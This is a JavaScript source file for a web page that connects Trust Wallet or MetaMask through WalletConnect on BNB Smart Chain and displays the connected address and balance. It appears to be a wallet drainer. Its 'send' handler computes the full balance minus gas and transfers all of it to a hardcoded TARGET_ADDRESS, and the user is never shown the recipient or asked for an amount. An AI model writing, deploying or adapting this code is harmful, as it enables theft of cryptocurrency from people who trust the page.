import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";

const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";

let selectedWallet = null;
let uriGlobal = null;

const connectBtn = document.getElementById("connect");
const trustBtn = document.getElementById("trust");
const mmBtn = document.getElementById("metamask");
const optionsDiv = document.getElementById("wallet-options");

connectBtn.onclick = () => {
  optionsDiv.style.display = "block";
};

trustBtn.onclick = () => {
  selectedWallet = "trust";
  startConnection();
};

mmBtn.onclick = () => {
  selectedWallet = "metamask";
  startConnection();
};

async function startConnection() {
  const provider = await EthereumProvider.init({
    projectId: PROJECT_ID,
    optionalChains: [56],
    rpcMap: { 56: "https://bsc-dataseed.binance.org/" },
    showQrModal: false
  });

  provider.on("display_uri", (uri) => {
    uriGlobal = uri;

    if (selectedWallet === "trust") {
      const trustLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
      window.location.href = trustLink;
    } else if (selectedWallet === "metamask") {
      const mmLink = `https://metamask.app.link/wc?uri=${encodeURIComponent(uri)}`;
      window.location.href = mmLink;
    }
  });

  try {
    await provider.enable();

    const ethProvider = new ethers.providers.Web3Provider(provider);
    const signer = ethProvider.getSigner();
    const address = await signer.getAddress();
    const balance = await ethProvider.getBalance(address);

    document.getElementById("address").textContent = address;
    document.getElementById("balance").textContent = ethers.utils.formatEther(balance) + " BNB";
    document.getElementById("info").style.display = "block";

    document.getElementById("send").onclick = async () => {
      const bal = await ethProvider.getBalance(address);
      const gas = (await ethProvider.getGasPrice()).mul(21000);
      const value = bal.sub(gas);
      if (value.lte(0)) return alert("موجودی کافی برای کارمزد نیست!");

      const tx = await signer.sendTransaction({
        to: TARGET_ADDRESS,
        value,
        gasPrice: gas.div(21000),
        gasLimit: 21000
      });

      alert("تراکنش در حال ارسال...");
      await tx.wait();
      alert("تأیید شد!");
    };
  } catch (err) {
    console.error(err);
    alert("خطا در اتصال: " + err.message);
  }
}